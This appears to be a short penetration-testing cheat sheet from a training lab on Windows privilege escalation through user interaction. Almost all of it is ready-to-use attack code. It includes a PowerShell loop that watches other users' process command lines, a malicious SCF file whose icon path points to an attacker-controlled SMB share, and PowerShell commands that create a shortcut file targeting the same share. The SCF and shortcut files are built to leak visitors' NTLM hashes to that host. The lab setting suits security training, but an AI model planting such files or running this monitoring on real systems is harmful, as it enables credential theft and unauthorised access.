# Interacting with Users

## Command Line Monitoring

```powershell title="monitor.ps1" linenums="1"
while ($true)
{
    $p1 = Get-WmiObject Win32_Process | Select-Object CommandLine

    Start-Sleep 1

    $p2 = Get-WmiObject Win32_Process | Select-Object CommandLine

    Compare-Object -ReferenceObject $p1 -DifferenceObject $p2
}
```

## Malicious Files

### [SCF](https://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/)

```ini title="@important.scf" linenums="1"
[Shell]
Command=2
IconFile=\\10.10.14.164\share\important.ico
[Taskbar]
Command=ToggleDesktop
```

### LNK

```pwsh
PS C:\Users\htb-student> $obj = New-Object -ComObject WScript.Shell
PS C:\Users\htb-student> $lnk = $obj.CreateShortcut("C:\important.lnk")
PS C:\Users\htb-student> $lnk.TargetPath = "\\10.10.14.164\@important.png"
PS C:\Users\htb-student> $lnk.WindowStyle = 1
PS C:\Users\htb-student> $lnk.IconLocation = "%windir%\system32\shell32.dll, 3"
PS C:\Users\htb-student> $lnk.Description = "important"
PS C:\Users\htb-student> $lnk.Hotkey = "Ctrl+Alt+O"
PS C:\Users\htb-student> $lnk.Save()
```
